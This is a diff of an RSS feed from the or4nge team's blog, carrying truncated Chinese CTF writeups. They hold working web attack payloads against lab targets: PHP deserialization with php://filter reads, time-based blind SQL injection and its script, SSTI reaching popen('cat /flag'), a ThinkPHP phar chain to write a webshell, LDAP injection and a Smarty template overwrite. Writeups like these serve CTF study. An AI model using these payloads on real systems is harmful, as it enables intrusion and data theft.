@@ -6,7 +6,19 @@
     <description>Recent content in Posts on or4nge</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 31 Aug 2022 11:45:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 07 Nov 2022 19:00:00 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>“强网”拟态 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/qwnt-writeup-by-or4nge/</link>
+      <pubDate>Mon, 07 Nov 2022 19:00:00 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/qwnt-writeup-by-or4nge/</guid>
+      <description>Web ezus 第一层，使用中文绕过basename即可。​ http://172.51.223.142/index.php/tm.php/%E6%88%91?source​ 第二层的目标是进@include，读hint.php。​ 三个需要绕过的东西：构建反序列化受限用字符逃逸，wakeup用增加属性数，strpos用路径穿越。
+username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;amp;password=&amp;#34;;s:11:&amp;#34;%00*%00password&amp;#34;;O:5:&amp;#34;order&amp;#34;:3:{s:1:&amp;#34;f&amp;#34;;s:83:&amp;#34;php://filter/read=convert.base64-encode/resource=/var/www/html/pass/../try/../index&amp;#34;;s:4:&amp;#34;hint&amp;#34;;s:16:&amp;#34;http://locathost&amp;#34;;}}}​ 第三层，用一个不存在的协议名绕parse_url（parse_url会解析出host，但file_get_contents会将其解析为路径），路径穿越读取即可。​
+username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;amp;password=&amp;#34;;s:11:&amp;#34;%00*%00password&amp;#34;;O:5:&amp;#34;order&amp;#34;:3:{s:1:&amp;#34;f&amp;#34;;s:82:&amp;#34;php://filter/read=convert.base64-encode/resource=/var/www/html/pass/../try/../hint&amp;#34;;s:4:&amp;#34;hint&amp;#34;;s:46:&amp;#34;0://prankhub/../../../../../f1111444449999.txt&amp;#34;;}}} Popsql 时间盲注，但过滤了非常多的东西。​ sleep被过滤，用benchmark替代，进行延时。​ username=admin&amp;amp;password=&#39;/**/or/**/if(1,benchmark(1000000000,1),1)#（验证时间盲注存在） =，like，regexp全没了，用取模运算代替，进行逐字符判断；​ ascii被过滤了，用ord代替；​ substr、left被过滤了，用right代替。​ 此时若提取出的字符是不是模数的倍数，则不会延时，否则会延时。因为这样会时间特别长，在外面加个not。 username=admin&amp;amp;password=&#39;/**/or/**/if((not(select(ord(right(database(),%d)))%%(%d))),benchmark(1000000000,1),1)#&amp;quot; % (i,j)（获取数据库名 ctfgame）​ username=admin&amp;amp;password=&#39;/**/or/**/if((not(select(ord(right(version(),%d)))%%(%d))),benchmark(1000000000,1),1)#&amp;quot; % (i,j)（获取版本号 5.7.39）​ information被滤，使用sys.schema_table_statistics_with_buffer库获取表名。​ username=admin&amp;amp;password=&#39;/**/or/**/if(not((select/**/ord(right(group_concat(table_name),%d))%%(%d)/**/from/**/sys.schema_table_statistics_with_buffer)),benchmark(1000000000,1),1)#&amp;quot; % (i,j) （获取表名 Fl49ish3re）​ 尝试无列名注入，但没有union；赌表里只有一列，发现不是。​ username=admin&amp;amp;password=&#39;/**/or/**/if((ord(right((select/**/*/**/from/**/Fl49ish3re/**/limit/**/0,1),1))%(52)),benchmark(1000000000,1),1);（表里只有一列情况下的无列名注入）​ 网上搜索，找到flag所处的列名f1aG123​ https://hwwg.github.io/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/​ 获取flag。​ &amp;quot;username=admin&amp;amp;password=&#39;/**/or/**/if(not(ord(right((select/**/group_concat(f1aG123)/**/from/**/Fl49ish3re),%d))%%(%d)),benchmark(1000000000,1),1)#&amp;quot; % (i, ord(j))
+import time​ ​ import requests​ import string​ ​ headers = {&amp;#34;Content-Type&amp;#34;:&amp;#34;application/x-www-form-urlencoded&amp;#34;}​ url=&amp;#34;http://172.51.223.119/index.php&amp;#34;​ proxy={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}​ result=&amp;#34;&amp;#34;​ ​ record=0​ s=string.digits+string.ascii_letters+&amp;#34;{}_&amp;#34;​ for i in range(1,200):​ for j in s:​ #data = &amp;#34;username=admin&amp;amp;password=&amp;#39;/**/or/**/if(1,benchmark(1000000000,1),1)#&amp;#34;​ #data = &amp;#34;username=admin&amp;amp;password=&amp;#39;/**/or/**/if((not(select(ord(right(database(),%d)))%%(%d))),benchmark(1000000000,1),1)#&amp;#34; % (i,j)​ #data = &amp;#34;username=admin&amp;amp;password=&amp;#39;/**/or/**/if((not(select(ord(right(version(),%d)))%%(%d))),benchmark(1000000000,1),1)#&amp;#34; % (i,j)​ #data = &amp;#34;username=admin&amp;amp;password=&amp;#39;/**/or/**/if(not((select/**/ord(right(group_concat(table_name),%d))%%(%d)/**/from/**/sys.</description>
+    </item>
+    
     <item>
       <title>2022网鼎杯初赛 Writeup by or4nge</title>
       <link>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</link>
@@ -61,7 +73,7 @@ from pwn import * import sys context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;a
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--+ 把文件写入表中：
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--+ 读取数据：
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--+ debug模式为开，考虑计算flask debug pin，exp如下：
-import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup linux = machine_id + boot_id + cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username &amp;#39;flask.</description>
+import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id + boot_id + cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.</description>
     </item>
     
     <item>
@@ -70,13 +82,13 @@ import hashlib from itertools import chain def get_machine_id(): machine_id = &a
       <pubDate>Fri, 25 Feb 2022 22:32:31 +0800</pubDate>
       
       <guid>https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/</guid>
-      <description>week1 [Web]Fujiwara Tofu Shop By SSGSS
-一个个改请求头就 ok
-GET / HTTP/1.1 Host: game.summ3r.top User-Agent: Hachi-Roku Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Gasoline: 100 Cookie: flavor=Raspberry; Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Referer: qiumingshan.net X-Real-IP: 127.0.0.1 [Web]Tetris plus By SSGSS
-一个个翻 js，长度最长的那个用 js 运行一下就是 flag
-[Web]蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛 By SSGSS
-爬虫题
-import requests import re url = &amp;#39;https://hgame-spider.vidar.club/b7412bb0b0&amp;#39; now = &amp;#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D&amp;#39; while True: r = requests.get(url + now) try: now = re.search(r&amp;#39;\?key=.*?&amp;#34;&amp;#39;, r.</description>
+      <description>week1 [Web]Fujiwara Tofu Shop  By SSGSS
+ 一个个改请求头就 ok
+GET / HTTP/1.1Host: game.summ3r.topUser-Agent: Hachi-RokuAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeGasoline: 100Cookie: flavor=Raspberry;Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Referer: qiumingshan.netX-Real-IP: 127.0.0.1[Web]Tetris plus  By SSGSS
+ 一个个翻 js，长度最长的那个用 js 运行一下就是 flag
+[Web]蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛  By SSGSS
+ 爬虫题
+import requests import re url = &amp;#39;https://hgame-spider.vidar.club/b7412bb0b0&amp;#39; now = &amp;#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D&amp;#39; while True: r = requests.get(url + now) try: now = re.</description>
     </item>
     
     <item>
@@ -86,24 +98,26 @@ import requests import re url = &amp;#39;https://hgame-spider.vidar.club/b7412bb
       
       <guid>https://or4ngesec.github.io/post/hws2022-writeup/</guid>
       <description>RE babyVM 将花指令patch掉
+
+
 将patch好的应用到文件。
+
 能看出来是个虚拟机逆向题
+
 动态调试的过程中可以看到程序向内存里写了一段数据
-0xFF,0x223,0x23B,0x237,0x237,0x24B,0x22B,0xFB,0x22B,0x223,0x24F,0xEF,0x237,0xEF,0x24F,0x24F,0x223,0x223,0x23B,0x237,0xFF,0x233,0x233,0x233,0x237,0x24B,0x233,0x24F,0x22B,0x22B,0x24B,0xEF 这个部分把上述数据每一个都减了0x63
+0xFF,0x223,0x23B,0x237,0x237,0x24B,0x22B,0xFB,0x22B,0x223,0x24F,0xEF,0x237,0xEF,0x24F,0x24F,0x223,0x223,0x23B,0x237,0xFF,0x233,0x233,0x233,0x237,0x24B,0x233,0x24F,0x22B,0x22B,0x24B,0xEF
+这个部分把上述数据每一个都减了0x63
 程序获得用户的输入
+
 比较的过程中可以发现，用户输入的长度应该是0x26
+
 并且在后面比较的过程中，flag{}这几个字符占了6个。
 再向后跟踪的过程中发现
+
 用户的输入和0x42做了异或
+
 再把结果左移两位，和前面的数据做了比较，因此最后的exp是：
-dump = [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140] for i in range(len(dump)): print(chr((dump[i]&amp;gt;&amp;gt;2)^0x42),end=&amp;#39;&amp;#39;) print() # e247780d029a7a992247e6667869008a EasyVM 和上题一样，去除应该应该去除的花指令。
-然后引发了一个异常
-观察异常处理函数
-看到输入的长度为42
-在这个函数里面输入经过了base64编码，而且和0xa,0xb,0xc,0xd异或
-然后根据函数地址表进行虚拟机逻辑。
-动态调试中可以发现函数将输入经过特制变换的 base64 和前一个结果异或，和 0xee 异或，再进行比较，然后动态调试的过程中把最终的结果提取出来，可以写出脚本。
-import base64 dump = [0x00,0xBE, 0x36, 0xAC, 0x27, 0x99, 0x4F, 0xDE, 0x44, 0xEE, 0x5F, 0xDA, 0x0B, 0xB5, 0x17, 0xB8, 0x68, 0xC2, 0x4E, 0x9C, 0x4A, 0xE1, 0x43, 0xF0, 0x22, 0x8A, 0x3B, 0x88, 0x5B, 0xE5, 0x54, 0xFF, 0x68, 0xD5, 0x67, 0xD4, 0x06, 0xAD, 0x0B, 0xD8, 0x50, 0xF9, 0x58, 0xE0, 0x6F, 0xC5, 0x4A, 0xFD, 0x2F, 0x84, 0x36, 0x85, 0x52, 0xFB, 0x73, 0xD7, 0x0D, 0xE3] x = [0xa,0xb,0xc,0xd] dump = dump[::-1] dump1 = [] for i in range(1,len(dump)): dump1.</description>
+dump = [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140] for i in range(len(dump)): print(chr((dump[i]&amp;gt;&amp;gt;2)^0x42),end=&amp;#39;&amp;#39;) print() # e247780d029a7a992247e6667869008a EasyVM</description>
     </item>
     
     <item>
@@ -114,15 +128,15 @@ import base64 dump = [0x00,0xBE, 0x36, 0xAC, 0x27, 0x99, 0x4F, 0xDE, 0x44, 0xEE,
       <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
       <description>Web RCE_No_Para 无参数RCE，且过滤了部分函数。
 最终payload：
-?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars()))); flask 查看网页源码
-&amp;lt;!--if not request.full_path.endswith(&amp;#34;.js?&amp;#34;): if not request.full_path.startswith(&amp;#34;/login&amp;#34;): return redirect(&amp;#34;login&amp;#34;)--&amp;gt; 要求路径是以/login开头，以.js?结尾，
+?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars())));flask 查看网页源码
+&amp;lt;!--if not request.full_path.endswith(&amp;quot;.js?&amp;quot;):if not request.full_path.startswith(&amp;quot;/login&amp;quot;):return redirect(&amp;quot;login&amp;quot;)--&amp;gt;要求路径是以/login开头，以.js?结尾，
 查看 flask 文档
 Requested path, including the query string.
 所以构造路径：
-/login/../admin?a=.js? 然后源码提示：
-&amp;lt;!--admin/?name=--&amp;gt; 使用以下路径发现是ssti
-/login/../admin?name={{7*7}}&amp;amp;a=.js? fuzz发现过滤了__，builtins，所以绕，最终payload
-/login/../admin?name={{config|attr(&amp;#39;_&amp;#39;+&amp;#39;_init_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_globals_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_getitem_&amp;#39;+&amp;#39;_&amp;#39;)(&amp;#39;_&amp;#39;+&amp;#39;_buil&amp;#39;+&amp;#39;tins_&amp;#39;+&amp;#39;_&amp;#39;)|attr(&amp;#39;_&amp;#39;+&amp;#39;_getitem_&amp;#39;+&amp;#39;_&amp;#39;)(&amp;#39;eval&amp;#39;)(&amp;#39;_&amp;#39;+&amp;#39;_import_&amp;#39;+&amp;#39;_(&amp;#34;os&amp;#34;).popen(&amp;#34;cat /flag&amp;#34;).read()&amp;#39;)}}&amp;amp;a=.js? tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
+/login/../admin?a=.js?然后源码提示：
+&amp;lt;!--admin/?name=--&amp;gt;使用以下路径发现是ssti
+/login/../admin?name={{7*7}}&amp;amp;a=.js?fuzz发现过滤了__，builtins，所以绕，最终payload
+/login/../admin?name={{config|attr(&#39;_&#39;+&#39;_init_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_globals_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;_&#39;+&#39;_buil&#39;+&#39;tins_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;eval&#39;)(&#39;_&#39;+&#39;_import_&#39;+&#39;_(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()&#39;)}}&amp;amp;a=.js?tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
 生成phar文件
 &amp;lt;?php namespace think\process\pipes; class Windows { private $files = []; public function __construct() { $this-&amp;gt;files = [new \think\model\Merge]; } } namespace think\model; use think\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-&amp;gt;append = [ &amp;#39;bb&amp;#39; =&amp;gt; &amp;#39;getError&amp;#39; ]; $this-&amp;gt;error = (new \think\model\relation\BelongsTo); } } namespace think; class Model{} namespace think\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-&amp;gt;styles = [&amp;#39;removeWhereField&amp;#39;]; $this-&amp;gt;handle = (new \think\session\driver\Memcache); } } namespace think\model\relation; class BelongsTo { protected $query; public function __construct() { $this-&amp;gt;query = (new \think\console\Output); } } namespace think\session\driver; class Memcache { protected $handler = null; public function __construct() { $this-&amp;gt;handler = (new \think\cache\driver\Memcached); } } namespace think\cache\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-&amp;gt;tag = false; $this-&amp;gt;options = [ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;data_compress&amp;#39; =&amp;gt; false, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
     </item>
@@ -151,24 +165,26 @@ Upload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 
       <description>转载自战队成员博客: https://s0uthwood.github.io/post/two-challenges-in-kctf2021-fall/
 第一题 签到 这题还是比较容易的，需要一点点动调的经验
 上张队友的截图吧，懒得自己截了
+
 动调看看内存就知道，流程是：
 serial-&amp;gt;十进制-&amp;gt;与name的crc异或-&amp;gt;计算crc
 最后需要是一个固定的值，于是只需要想办法反解就行了
 这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束
 由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了
 接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了
-靠记忆写的，希望没错
-第二题 迷失丛林 这题就直接放提交的wp了
-很容易定位到程序的输入
+ 靠记忆写的，希望没错
+ 第二题 迷失丛林  这题就直接放提交的wp了
+ 很容易定位到程序的输入
+
 输入长度为32，需要通过 sub_4014A0, sub_401580 的验证
 4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}
 随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580
 要想让该函数返回1，需要先通过如下的if验证
+
 简单看一下使用的变量，应该是对前八字节的输入进行的验证
+
 结合动调发现大概就是根据404000数组，构成一个 &amp;lt;value, index&amp;gt; 的结构，两两存放到404420当中
-分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!=40320$ 种可能，完全可以爆破
-把ida代码复制下来改一改
-#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;algorithm&amp;gt; #include &amp;lt;cstring&amp;gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp unsigned char *v3; // eax int *v4; // esi unsigned char *v5; // ecx int v6; // edi unsigned char *v7; // ecx int v8; // edx unsigned char *v9; // eax int v10; // ecx int v11; // esi int v12; // eax unsigned char v13; // dl int v14; // edi int v15; // eax int v16; // ecx int v17; // esi int i; // eax char v19; // dl unsigned char v21; // [esp+10h] [ebp-Ch] unsigned char v22; // [esp+11h] [ebp-Bh] unsigned char v23; // [esp+12h] [ebp-Ah] unsigned char v24; // [esp+13h] [ebp-9h] unsigned char *v25; // [esp+14h] [ebp-8h] v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i &amp;lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = &amp;amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h if ( *v4 &amp;gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 &amp;lt; &amp;amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 &amp;lt; 256 ); v9 = &amp;amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 &amp;amp;&amp;amp; v22 == 0xAC &amp;amp;&amp;amp; v23 == 0xA7 &amp;amp;&amp;amp; v24 &amp;gt; 0xC8u ){ for (i = 0; i &amp;lt; 8; i++){ printf(&amp;#34;%hhX&amp;#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } 转换一下得到前八字节 B4D682C8BF2DE13A</description>
+分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!</description>
     </item>
     
     <item>
@@ -181,12 +197,13 @@ serial-&amp;gt;十进制-&amp;gt;与name的crc异或-&amp;gt;计算crc
 Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
 [萌]odd_upload 题目描述：目录结构与官方项目example相同
 所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
+
 flag{1ae85554-c785-4321-8d77-0f68974929f8}
 easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
 The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
 说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
-按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
-Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
+按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
+Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
 import requests url = &amp;#34;http://47.</description>
     </item>
     
@@ -198,7 +215,7 @@ import requests url = &amp;#34;http://47.</description>
       <guid>https://or4ngesec.github.io/post/bluehat-final-writeup/</guid>
       <description>Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
 winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
-In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
+In order to prevent leaving evidence, Zhang San deleted all the key evidence photos.因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
 Pwn secretcode 掏出初赛的代码稍微改改
 from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.</description>
     </item>
